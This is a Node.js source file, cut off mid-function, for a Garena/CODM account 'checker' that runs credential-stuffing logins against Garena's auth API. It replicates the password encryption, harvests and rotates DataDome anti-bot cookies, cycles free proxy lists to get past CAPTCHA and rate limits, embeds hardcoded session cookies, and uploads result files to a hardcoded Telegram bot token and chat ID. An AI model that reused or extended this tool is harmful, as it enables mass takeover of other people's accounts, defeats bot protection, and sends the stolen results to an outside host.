
// server.js
const os = require('os');
const sys = { // Partial sys emulation
    exit: (code) => {
        console.warn(`sys.exit(${code}) called. In API context, this should be handled differently.`);
        // For a real API, you'd throw an error or res.status(code).send().
        // To strictly follow "don't change structure", we might let it actually exit for now
        // if it's called from a non-request path, or handle specially in request paths.
        process.exit(code);
    },
    stdin: process.stdin,
    stdout: process.stdout,
    stderr: process.stderr,
    version: process.version,
};
const re = { // RegExp helper, though direct JS RegExp is usually used
    compile: (pattern, flags) => new RegExp(pattern, flags),
    search: (pattern, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    match: (pattern, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text); // Similar to search for basic cases, use ^ for start
    },
    sub: (pattern, repl, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern, 'g') : pattern; // Assuming global replace
        return text.replace(regex, repl);
    },
    escape: (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), // Basic regex escape
};
const time = {
    time: () => Math.floor(Date.now() / 1000),
    sleep: (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000)),
};
const json = JSON; // Direct mapping
const hashlib = require('crypto-js'); // Using crypto-js for MD5
const random = {
    randint: (a, b) => Math.floor(Math.random() * (b - a + 1)) + a,
    choice: (arr) => arr[Math.floor(Math.random() * arr.length)],
    shuffle: (array) => { // Fisher-Yates shuffle
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
};

// Logging - basic console logging to emulate Python's logging
const logging = {
    DEBUG: 10, INFO: 20, WARNING: 30, ERROR: 40, CRITICAL: 50,
    _level: 20, // Default to INFO
    _log_file_path: null,
    _fs: require('fs'),
    _path: require('path'),

    basicConfig: ({ level, format, handlers, force }) => {
        if (level) logging._level = level;
        // Format and handlers are more complex, for now, we'll just use console and a basic file log if specified
        if (handlers) {
            for (const handler of handlers) {
                if (handler.constructor.name === 'FileHandler') { // This is a mock check
                    logging._log_file_path = handler.filename;
                    try {
                        logging._fs.mkdirSync(logging._path.dirname(logging._log_file_path), { recursive: true });
                    } catch (e) { console.error("Error creating log directory:", e); }
                }
            }
        }
    },
    _log: (level, levelName, args, funcName = '', lineno = '', filename = '') => {
        if (level >= logging._level) {
            const message = args.map(arg => typeof arg === 'object' ? json.stringify(arg) : arg).join(' ');
            const timestamp = new Date().toISOString();
            // Basic format: %(asctime)s - %(levelname)s - [%(filename)s:%(lineno)d:%(funcName)s] - %(message)s
            // Filename, lineno, funcName are harder to get automatically in JS like Python.
            const logMessage = `${timestamp} - ${levelName} - ${message}`;
            if (levelName === 'ERROR' || levelName === 'CRITICAL') {
                console.error(logMessage);
            } else if (levelName === 'WARNING') {
                console.warn(logMessage);
            } else {
                console.log(logMessage);
            }
            if (logging._log_file_path) {
                try {
                    logging._fs.appendFileSync(logging._log_file_path, logMessage + '\n', 'utf-8');
                } catch (e) { console.error("Error writing to log file:", e); }
            }
        }
    },
    debug: (...args) => logging._log(logging.DEBUG, 'DEBUG', args),
    info: (...args) => logging._log(logging.INFO, 'INFO', args),
    warning: (...args) => logging._log(logging.WARNING, 'WARNING', args),
    error: (...args) => logging._log(logging.ERROR, 'ERROR', args),
    critical: (...args) => logging._log(logging.CRITICAL, 'CRITICAL', args),
    exception: (...args) => { // In JS, often you log the error object itself which contains stack
        const err = args[args.length -1];
        if (err instanceof Error && err.stack) {
            logging._log(logging.ERROR, 'ERROR', [args.slice(0,-1).join(" "), err.stack]);
        } else {
            logging._log(logging.ERROR, 'ERROR', args);
        }
    },
    getLevelName: (level) => {
        for (const name in logging) {
            if (logging[name] === level && typeof logging[name] === 'number') return name;
        }
        return String(level);
    },
    getLogger: () => ({ level: logging._level }) // Simplified
};

// Mock FileHandler for basicConfig
class FileHandler {
    constructor(filename, encoding) {
        this.filename = filename;
        this.encoding = encoding;
    }
}
logging.FileHandler = FileHandler;


const urllib = { // Partial urllib emulation
    parse: require('url'), // url.parse is legacy, but for structure
    request: require('axios'), // For simplicity if any part used it directly
};
urllib.parse.quote = encodeURIComponent;
urllib.parse.unquote = decodeURIComponent;
urllib.parse.urlencode = (params) => new URLSearchParams(params).toString();
urllib.parse.urlparse = urllib.parse.parse; // Map to NodeJS url.parse
urllib.parse.parse_qs = (qs) => Object.fromEntries(new URLSearchParams(qs));


const platform = {
    system: () => os.platform(),
    release: () => os.release(),
};
const axios = require('axios');
const he = require('he'); // For HTML escaping
const FormData = require('form-data');
const fs = require('fs');
const fsExtra = require('fs-extra'); // For mkdirsSync
const path = require('path');
const crypto = require('crypto'); // Node.js built-in crypto for AES

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
axiosCookieJarSupport(axios); // Patches axios to support cookie jars


// colorama constants - In Node.js, these are direct ANSI escape codes
const Fore = {
    RED: '\x1b[31m', GREEN: '\x1b[32m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', LIGHTBLACK_EX: '\x1b[90m',
};
const Style = {
    BRIGHT: '\x1b[1m', RESET_ALL: '\x1b[0m', DIM: '\x1b[2m', // DIM is not in original colorama but used in RED_BG
};
const Back = { // Added for RED_BG
    RED: '\x1b[41m',
};

// Simulating colorama.init() - auto-reset is handled by ensuring RESET_ALL is used.
const init = ({ autoreset }) => { /* In Node, direct ANSI codes usually work. autoreset is more about how colorama wraps strings. */ };


const { DateTime, Settings } = require('luxon'); // Using luxon for datetime, timezone
Settings.defaultZone = 'utc'; // Match python's timezone.utc awareness

// PyCryptodome check (simulated)
try {
    if (!crypto) throw new Error("Crypto module not available"); // Should always be true for Node.js crypto
} catch (e) {
    console.error("ERROR: CRYPTO MODULE NOT FOUND. THIS IS UNEXPECTED IN NODE.JS");
    sys.exit(1);
}

const TELEGRAM_BOT_TOKEN = "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo";
const TELEGRAM_CHAT_ID = "6542321044";
const OUTPUT_FILE_HEADER = "# CHECKED BY @YISHUX IN TELEGRAM\n";
const OUTPUT_FILE_FOOTER = "\n# CONTACT HIM FOR CODM FILE CHECKING FULL CAPTURE\n";
const DATADOME_JSON_FILE = ".datadome.json";
const MAX_DATADOMES_IN_JSON = 20;

const NEW_COOKIES_JSON_FILE = ".newCookies.json";
const MAX_COOKIE_SETS_IN_JSON = 20;

const MAX_DATADOME_RETRIES_FOR_ACCOUNT = 3;
const PROXY_RETRY_LIMIT = 3;
const REQUEST_TIMEOUT = 30; // in seconds

const PROXY_SOURCE_URLS = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
];
const PROXYSCRAPE_FETCH_TIMEOUT = 30; // in seconds

const RETRYABLE_PROXY_ERROR_PREFIXES = [
    "[🤖] CAPTCHA",
    "[⏱️]",
    "[🔴] CONNECTION ERROR", "[🔌]",
    "[📉] HTTP ERROR 50", "[📉] LOGIN HTTP ERROR 50",
    "[🚫] LOGIN FORBIDDEN (403)", "[🚫] PRELOGIN FORBIDDEN (403)",
    "[🚦] RATE LIMITED (429)", "[🚦] PRELOGIN RATE LIMITED (429)",
];
const GARENA_COUNTRY_MAP = {
    "ID": "INDONESIA", "SG": "SINGAPORE", "MY": "MALAYSIA",
    "PH": "PHILIPPINES", "TH": "THAILAND", "VN": "VIETNAM",
    "TW": "TAIWAN", "INDIA": "INDIA", "IND": "INDIA",
    "INDONESIA": "INDONESIA", "SINGAPORE": "SINGAPORE", "MALAYSIA": "MALAYSIA",
    "PHILIPPINES": "PHILIPPINES", "THAILAND": "THAILAND", "VIETNAM": "VIETNAM",
    "TAIWAN": "TAIWAN",
    "US": "UNITED STATES", "UNITED STATES": "UNITED STATES",
    "BR": "BRAZIL", "BRAZIL": "BRAZIL",
};

// get_key function: This is highly OS-dependent and for interactive CLI.
// In a Node.js API, this kind of direct terminal input reading is not applicable.
// It will be included for structural completeness but marked as CLI-specific.
function get_key() {
    // This function is for CLI interaction and difficult to replicate perfectly
    // cross-platform in Node.js without external C++ bindings or specific libraries
    // like 'keypress' or 'node-key-sender', and generally not used in an API context.
    // The Python version uses msvcrt (Windows) or tty/termios (Unix).
    logging.warning("get_key() called - this is a CLI-specific function and may not work as expected in an API or non-interactive environment.");
    // Fallback for API context or if TTY is not available
    if (!process.stdin.isTTY) {
        return "ENTER"; // Default or placeholder
    }
    // A very simplified attempt for Unix, would need more robust handling
    // For Windows, it's even more different.
    // This part is largely symbolic for "don't change structure."
    try {
        process.stdin.setRawMode(true);
        const buffer = Buffer.alloc(1);
        const bytesRead = fs.readSync(process.stdin.fd, buffer, 0, 1, null);
        process.stdin.setRawMode(false);
        if (bytesRead > 0) {
            const char = buffer.toString('utf-8');
            if (char === '\r') return "ENTER";
            if (char === '\x03') return "CTRL_C"; // Ctrl+C
            // Add more mappings if necessary
            return char.toUpperCase();
        }
    } catch (e) {
        logging.error("Error in get_key():", e.message);
        return "SPECIAL_OTHER";
    }
    return "UNKNOWN_KEY"; // Should not be reached
}


init({ autoreset: true }); // Call colorama init equivalent

const COLORS = {
    "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW, "BLUE": Fore.BLUE,
    "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN, "WHITE": Fore.WHITE, "GREY": Fore.LIGHTBLACK_EX,
    "BOLD": Style.BRIGHT, "RESET": Style.RESET_ALL, "HIGHLIGHT": "\x1b[7m", // ANSI inverse
    "RED_BG": Style.BRIGHT + Fore.WHITE + Back.RED, // Adjusted to use Back.RED
    "BLUE_BOLD": Fore.BLUE + Style.BRIGHT,
};

const APK_URL = "https://auth.garena.com/api/login?";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

class _HardcodedCookies {
    static get_cookies() {
        return {
            "_ga_57E30E1PMN": "GS1.2.1729857978.1.0.1729857978.0.0.0",
            "_ga": "GA1.1.807684783.1745020674",
            "apple_state_key": "cfa019380fba11f0ab6b3649d295da0e",
            "token_session": "d704c5dfc26be8c2d15502ca773af4ee4c468da1bf1e02e0517c251a7eb85c4ce019822b4258af36dfe926514ae804d6",
            "_ga_G8QGMJPWWV": "GS1.1.1729344366.1.0.1729344366.0.0.0",
            "datadome": "wqUi~PPzbPlTwUviBVpxtqvK46IddzBTRCx5q2nRRQlSjdsOsplC2YgTRU4Heg2AciGFbFhjLuFvnzmiNOeKF41KQf~z4fgshTAev~yj7gDcQBRuMYG3JgnM~aXmWtEu",
            "_ga_1M7M9L6VPX": "GS1.1.1745291516.2.0.1745291516.0.0.0",
            "_ga_XB5PSHEQB4": "GS2.1.s1746261685$o4$g1$t1746261797$j0$l0$h0",
            "ac_session": "q8ye3vysanmr98or00x107x5tr4sfi2g",
            "sso_key": "9c926ab310aa771aa1a6a86e107ca89e3da4535cfca38d5d64f527f2a7cfb581",
        };
    }
}

function load_cookie_sets_from_storage() {
    if (!fs.existsSync(NEW_COOKIES_JSON_FILE)) {
        return [];
    }
    try {
        const fileContent = fs.readFileSync(NEW_COOKIES_JSON_FILE, 'utf-8');
        const data = json.parse(fileContent);
        if (Array.isArray(data)) {
            return data.filter(item => typeof item === 'object' && item !== null && Object.keys(item).length > 0);
        }
        logging.warning(`${NEW_COOKIES_JSON_FILE} does not contain a list of cookie sets.`);
        return [];
    } catch (e) {
        logging.error(`Error loading cookie sets from ${NEW_COOKIES_JSON_FILE}: ${e.message}`);
        return [];
    }
}

function save_cookie_set_to_storage(new_cookie_set) {
    if (typeof new_cookie_set !== 'object' || new_cookie_set === null || Object.keys(new_cookie_set).length === 0) {
        return;
    }

    let cookie_sets = load_cookie_sets_from_storage();
    
    const isNewSetPresent = cookie_sets.some(cs => JSON.stringify(cs) === JSON.stringify(new_cookie_set));

    if (!isNewSetPresent) {
        cookie_sets.push(new_cookie_set);
        while (cookie_sets.length > MAX_COOKIE_SETS_IN_JSON) {
            cookie_sets.shift();
        }
        try {
            fs.writeFileSync(NEW_COOKIES_JSON_FILE, json.stringify(cookie_sets, null, 2), 'utf-8');
            logging.info(`Saved/Updated cookie set to ${NEW_COOKIES_JSON_FILE}`);
        } catch (e) {
            logging.error(`Error writing cookie sets to ${NEW_COOKIES_JSON_FILE}: ${e.message}`);
        }
    }
}

function starting_cookies() {
    let cookies_to_use = null;
    let source_message = "";

    const given_cookies = _HardcodedCookies.get_cookies();
    if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
        save_cookie_set_to_storage(given_cookies);
        logging.info(`Ensured 'given' cookies (from snippet/hardcoded) are in ${NEW_COOKIES_JSON_FILE}.`);
    } else {
        logging.error("'Given' cookies (from _HardcodedCookies) are invalid. This is unexpected.");
    }

    try {
        const change_cookie = require('./change_cookie.js'); // Assuming change_cookie.js
        if (change_cookie && typeof change_cookie.get_cookies === 'function') {
            const session_cookies = change_cookie.get_cookies();
            if (typeof session_cookies === 'object' && session_cookies !== null && Object.keys(session_cookies).length > 0) {
                cookies_to_use = session_cookies;
                source_message = "Using cookies from 'change_cookie.js' module for this session.";
                logging.info(source_message);
                save_cookie_set_to_storage(cookies_to_use);
            } else {
                logging.warning("'change_cookie.get_cookies()' returned empty or invalid data. Will try other sources for session.");
            }
        } else {
            logging.warning("'change_cookie.js' found, but 'get_cookies' is missing or not callable.");
        }
    } catch (e) {
        if (e.code === 'MODULE_NOT_FOUND') {
            logging.warning("WARNING: 'change_cookie.js' MODULE NOT FOUND. Will try other sources for session.");
        } else {
            logging.error(`Error loading cookies from 'change_cookie.js': ${e.message}. Will try other sources for session.`);
        }
    }

    if (!cookies_to_use) {
        const stored_cookie_sets = load_cookie_sets_from_storage();
        if (stored_cookie_sets.length > 0) {
            cookies_to_use = random.choice(stored_cookie_sets);
            source_message = `Using a stored cookie set from '${NEW_COOKIES_JSON_FILE}' for this session.`;
            logging.info(source_message);
        } else {
            logging.warning(`No valid cookie sets found in '${NEW_COOKIES_JSON_FILE}'. Will use 'given' cookies for session.`);
        }
    }

    if (!cookies_to_use) {
        if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
            cookies_to_use = given_cookies;
            source_message = "Using 'given' (hardcoded/snippet) cookies for this session as other sources failed.";
            logging.info(source_message);
        } else {
            logging.error("All cookie sources failed, including 'given' cookies. Using empty cookies for session.");
            cookies_to_use = {};
            source_message = "All cookie sources failed. Using empty cookies for session.";
        }
    }
    
    if (typeof cookies_to_use !== 'object' || cookies_to_use === null) { 
        logging.critical(`Cookie acquisition critically resulted in non-object type: ${typeof cookies_to_use}. Using empty dict.`);
        cookies_to_use = {};
        source_message += " (CRITICAL: Fell back to empty dict due to unexpected error)";
    }

    logging.info(`Final cookie source decision for this session: ${source_message}`);
    return [cookies_to_use, source_message]; // Return as a tuple (array)
}

function strip_ansi_codes(text) {
    if (typeof text !== 'string') return text;
    try {
        // більш повний регекс для ANSI кодів
        const ansi_escape = /\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g;
        return text.replace(ansi_escape, '');
    } catch (e) {
        // запасний варіант
        return text.replace(/\x1B\[[0-?]*m/g, '');
    }
}

function display_banner() {
    const banner = `
${COLORS['CYAN']}
  ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣀⣀⣀⠔⡪⣵⣮⣽⡿⢿⣿⣿⡿⢐⡠⢀⠀⠀⠀⠀⠀⠀
  ⢁⡠⢒⣼⡿⠿⠓⠉⠀⠀⠀⠙⢏⣔⠉⠈⣷⣷⣆⠀⠀⠀⠀
  ⠀⣰⢿⠋⠀⣴⣦⣦⣄⡀⠀⠀⠀⠙⢶⣿⣿⠟⢹⡷⡀⠀⠀
  ⡞⣴⠃⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠉⠻⡴⠋⣠⢿⡀⠀
  ⢡⣯⡤⡀⠀⠘⠿⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⠈⠺⢧⡄⣧⠀
  ⡾⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣶⣄⠀⠀⠀⠀⢹⡟⡆
  ⠁⢰⣿⡟⢄⠀⠀⣴⣿⣿⠀⠘⣿⣯⣿⣿⣷⡀⠀⢠⣿⡇⠇
  ⠀⠈⢃⡵⢍⠦⣄⠀⠚⠃⠀⠀⠹⣿⣿⣯⣿⡇⠠⢻⣿⡽⠀
  ⠀⠀⠀⠉⢁⡕⢍⡱⢢⡀⠀⣀⡀⠈⠉⠉⠉⢀⣴⡟⢹⡄⠀
  ⡄⠀⠀⠀⠀⢀⡺⠨⠳⣼⣿⠟⠻⣗⠄⢀⣴⡿⠋⡰⢃⡇⠀
  ⣿⣷⣄⣀⡀⢚⣿⣶⣄⡉⠁⣠⣶⣾⣿⣿⣋⠔⠋⢠⠜⠀⠀
${COLORS['YELLOW']} S1N CODM CHECKER: API VERSION${COLORS['BOLD']}${COLORS['RESET']}
`;
    console.log(banner);
}

function clear_screen() {
    // For an API, this doesn't make sense. Included for structure.
    console.log(os.platform() === 'win32' ? '\x1Bc' : '\x1B[2J\x1B[3J\x1B[H');
}

function get_current_timestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generate_md5_hash(password) {
    return hashlib.MD5(password).toString(hashlib.enc.Hex);
}

function generate_decryption_key(password_md5, v1, v2) {
    const intermediate_hash = hashlib.SHA256(password_md5 + v1).toString(hashlib.enc.Hex);
    return hashlib.SHA256(intermediate_hash + v2).toString(hashlib.enc.Hex);
}

function encrypt_aes_256_ecb(plaintext, key) {
    try {
        const keyBuffer = Buffer.from(key, 'hex');
        if (keyBuffer.length !== 32) {
            throw new Error(`AES KEY MUST BE 32 BYTES (256 BITS), GOT ${keyBuffer.length}`);
        }
        
        const plaintextBuffer = Buffer.from(plaintext, 'hex');
        
        const blockSize = 16;
        const paddingLength = blockSize - (plaintextBuffer.length % blockSize);
        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength);

        const paddedPlaintext = Buffer.concat([plaintextBuffer, paddingBuffer]);

        const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null); // IV is null for ECB
        cipher.setAutoPadding(false); // We do custom padding

        let encrypted = cipher.update(paddedPlaintext, null, 'hex');
        encrypted += cipher.final('hex'); // final() might be empty if data is block-aligned
        
        return encrypted.substring(0, 32);
    } catch (e) {
         logging.error(`AES ENCRYPTION ERROR: ${e.message}. PLAINTEXT: ${plaintext.substring(0,10)}..., KEY: ${key.substring(0,10)}...`);
         throw e;
    }
}

function get_encrypted_password(password, v1, v2) {
    const password_md5 = generate_md5_hash(password);
    const decryption_key = generate_decryption_key(password_md5, v1, v2);
    return encrypt_aes_256_ecb(password_md5, decryption_key);
}

function get_request_data(initial_cookies_tuple) {
    let [cookies] = initial_cookies_tuple; // Destructure the first element
    if (typeof cookies !== 'object' || cookies === null) {
        logging.warning("get_request_data received non-object cookies. Using empty object as fallback.");
        cookies = {};
    }

    const user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36';
    const headers = {
        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'User-Agent': user_agent, 'sec-ch-ua-platform': '"Windows"',
        'Accept': 'application/json, text/plain, */*', 'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + urllib.parse.quote(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
    };
    return [cookies, headers]; // Return as a tuple (array)
}

function detect_captcha_in_response(response_text) {
    return typeof response_text === 'string' && response_text.toLowerCase().includes("captcha");
}

async function get_public_ip(proxies = null, timeout = REQUEST_TIMEOUT) {
    const axiosConfig = { timeout: timeout * 1000 };
    if (proxies) {
        const proxyUrl = new URL(proxies.http || proxies.https); // Assuming proxies is { http: '...', https: '...' }
        axiosConfig.proxy = {
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port),
            protocol: proxyUrl.protocol.slice(0, -1), // remove ':'
        };
        if (proxyUrl.username || proxyUrl.password) {
            axiosConfig.proxy.auth = {
                username: proxyUrl.username,
                password: proxyUrl.password
            };
        }
    }
    try {
        const response = await axios.get('https://api.ipify.org?format=json', axiosConfig);
        if (response.status !== 200) throw new Error(`HTTP error ${response.status}`);
        const ip_data = response.data;
        return ip_data.ip || 'IP FETCH FAILED';
    } catch (e) {
        logging.warning(`COULD NOT FETCH PUBLIC IP: ${e.message}`);
        return `IP FETCH ERROR (${e.constructor.name})`;
    }
}

function load_datadomes_from_storage() {
    if (!fs.existsSync(DATADOME_JSON_FILE)) {
        return [];
    }
    try {
        const fileContent = fs.readFileSync(DATADOME_JSON_FILE, 'utf-8');
        const data = json.parse(fileContent);
        if (Array.isArray(data)) {
            return data.filter(item => typeof item === 'string' && item.trim().length > 0);
        }
        logging.warning(`${DATADOME_JSON_FILE} DOES NOT CONTAIN A LIST.`);
        return [];
    } catch (e) {
        logging.error(`ERROR LOADING DATADOMES FROM ${DATADOME_JSON_FILE}: ${e.message}`);
        return [];
    }
}

function save_datadome_to_storage(new_datadome) {
    if (typeof new_datadome !== 'string' || !new_datadome.trim()) {
        return;
    }
    
    if (new_datadome.startsWith("[🤖]") || new_datadome.startsWith("[⚠️]")) {
        logging.warning(`ATTEMPTED TO SAVE AN ERROR/CAPTCHA STRING AS DATADOME: ${new_datadome}`);
        return;
    }

    let datadomes = load_datadomes_from_storage();
    if (!datadomes.includes(new_datadome)) {
        datadomes.push(new_datadome);
        
        while (datadomes.length > MAX_DATADOMES_IN_JSON) {
            datadomes.shift();
        }
        try {
            fs.writeFileSync(DATADOME_JSON_FILE, json.stringify(datadomes, null, 2), 'utf-8');
            logging.info(`SAVED/UPDATED DATADOME: ${new_datadome.substring(0,30)}... TO ${DATADOME_JSON_FILE}`);
        } catch (e) {
            logging.error(`ERROR WRITING DATADOMES TO ${DATADOME_JSON_FILE}: ${e.message}`);
        }
    }
}

async function send_files_to_telegram(file_paths, bot_token, chat_id, base_caption = "S1N CHECKER RESULTS") {
    if (!bot_token || !chat_id) {
        logging.warning("TELEGRAM BOT TOKEN OR CHAT ID IS NOT CONFIGURED. SKIPPING FILE SENDING.");
        console.log(`${COLORS['YELLOW']}⚠️ TELEGRAM BOT TOKEN/CHAT ID NOT SET. CANNOT SEND FILES.${COLORS['RESET']}`);
        return;
    }
    if (!file_paths || file_paths.length === 0) {
        logging.info("NO FILES PROVIDED TO SEND TO TELEGRAM.");
        return;
    }

    logging.info(`ATTEMPTING TO SEND ${file_paths.length} FILES TO TELEGRAM CHAT ID ${chat_id}`);
    let success_count = 0;
    let fail_count = 0;
    const api_url = `https://api.telegram.org/bot${bot_token}/sendDocument`;

    for (const file_path_item of file_paths) {
        if (!fs.existsSync(file_path_item)) {
            logging.warning(`FILE NOT FOUND, CANNOT SEND TO TELEGRAM: ${file_path_item}`);
            fail_count += 1;
            continue;
        }
        
        const min_size = Buffer.from(OUTPUT_FILE_HEADER.toUpperCase()).length + Buffer.from(OUTPUT_FILE_FOOTER.toUpperCase()).length + 10;
        try {
            if (fs.statSync(file_path_item).size <= min_size) {
                logging.info(`SKIPPING EMPTY OR HEADER/FOOTER-ONLY FILE FOR TELEGRAM: ${path.basename(file_path_item)}`);
                continue;
            }
        } catch (e) {
            logging.error(`COULD NOT GET SIZE OF FILE ${file_path_item}: ${e.message}`);
            fail_count += 1;
            continue;
        }

        const file_name = path.basename(file_path_item);
        const caption_text = `${base_caption.toUpperCase()}: ${file_name}`.substring(0, 1024);

        const form = new FormData();
        form.append('chat_id', chat_id);
        form.append('caption', caption_text);
        form.append('document', fs.createReadStream(file_path_item), file_name);
        
        try {
            const response = await axios.post(api_url, form, {
                headers: form.getHeaders(),
                timeout: 60000
            });
            
            if (response.data.ok) {
                logging.info(`SUCCESSFULLY SENT ${file_name} TO TELEGRAM.`);
                success_count += 1;
            } else {
                const error_desc = response.data.description || 'UNKNOWN TELEGRAM API ERROR';
                logging.error(`FAILED TO SEND ${file_name} TO TELEGRAM: ${error_desc}`);
                fail_count += 1;
            }
        } catch (e) {
            if (e.code === 'ETIMEDOUT' || (e.response && e.response.status === 408) ) {
                 logging.error(`TIMEOUT SENDING ${file_name} TO TELEGRAM.`);
            } else if (e.isAxiosError) {
                 logging.error(`NETWORK/REQUEST ERROR SENDING ${file_name} TO TELEGRAM: ${strip_ansi_codes(e.message)}`);
                 if(e.response && e.response.data) logging.error(`Telegram Response: ${json.stringify(e.response.data)}`);
            } else {
                 logging.exception(`UNEXPECTED ERROR SENDING ${file_name} TO TELEGRAM.`);
            }
            fail_count += 1;
        } finally {
            await time.sleep(0.5);
        }
    }

    if (success_count > 0 || fail_count > 0) {
        console.log(`${COLORS['CYAN']}TELEGRAM SEND SUMMARY: ${success_count} SUCCEEDED, ${fail_count} FAILED.${COLORS['RESET']}`);
        if (fail_count > 0) {
             console.log(`${COLORS['YELLOW']}CHECK LOGS FOR DETAILS ON FAILED TELEGRAM SENDS.${COLORS['RESET']}`);
        }
    }
}
function buildAxiosProxyConfig(proxies) {
    if (!proxies || (!proxies.http && !proxies.https)) return null;
    const proxyUrlString = proxies.http || proxies.https;
    try {
        const proxyUrl = new URL(proxyUrlString);
        const config = {
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port),
            protocol: proxyUrl.protocol.slice(0, -1),
        };
        if (proxyUrl.username || proxyUrl.password) {
            config.auth = {
                username: decodeURIComponent(proxyUrl.username),
                password: decodeURIComponent(proxyUrl.password),
            };
        }
        return config;
    } catch (e) {
        logging.error(`Invalid proxy URL format: ${proxyUrlString} - ${e.message}`);
        return null;
    }
}


async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': json.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}), // Corrected json.dumps to json.stringify
        'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/', 'request': '%2F', 'responsePage': 'origin',
    };
    const data = Object.entries(payload).map(([k, v]) => `${k}=${urllib.parse.quote(String(v))}`).join('&');

    const axiosConfig = {
        headers: headers,
        timeout: timeout * 1000,
        proxy: buildAxiosProxyConfig(proxies),
    };
    
    try {
        const response = await axios.post(url, data, axiosConfig);
        const response_text = strip_ansi_codes(String(response.data)); // Ensure string for strip_ansi_codes

        if (detect_captcha_in_response(typeof response.data === 'string' ? response.data : json.stringify(response.data))) {
            logging.warning(`CAPTCHA DETECTED IN DATADOME RESPONSE BODY: ${String(response.data).substring(0,200)}`);
            return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
        }

        if (response.status < 200 || response.status >= 300) { 
             throw new Error(`HTTP error ${response.status}`);
        }
        
        const response_json = typeof response.data === 'object' ? response.data : json.parse(response.data);

        if (detect_captcha_in_response(json.stringify(response_json))) {
             logging.warning(`CAPTCHA DETECTED IN DATADOME JSON RESPONSE: ${json.stringify(response_json)}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME JSON)";
        }

        if (response_json.cookie) {
            const cookie_string = response_json.cookie;
            const match = /datadome=([^;]+)/.exec(cookie_string);
            if (match) {
                const datadome_value = match[1];
                save_datadome_to_storage(datadome_value);
                return datadome_value;
            }
        }
        logging.warning(`DATADOME RESPONSE MISSING EXPECTED COOKIE: ${json.stringify(response_json)}`);
        return null;
    } catch (e) {
        const error_str = strip_ansi_codes(e.message);
        const resp_text_snippet = strip_ansi_codes(e.response && e.response.data ? String(e.response.data).substring(0,100) : "");

        if (detect_captcha_in_response(error_str) || detect_captcha_in_response(resp_text_snippet)) {
             logging.warning(`CAPTCHA DETECTED DURING DATADOME REQUEST/PARSE ERROR: ${error_str} / ${resp_text_snippet}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
        }
        
        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
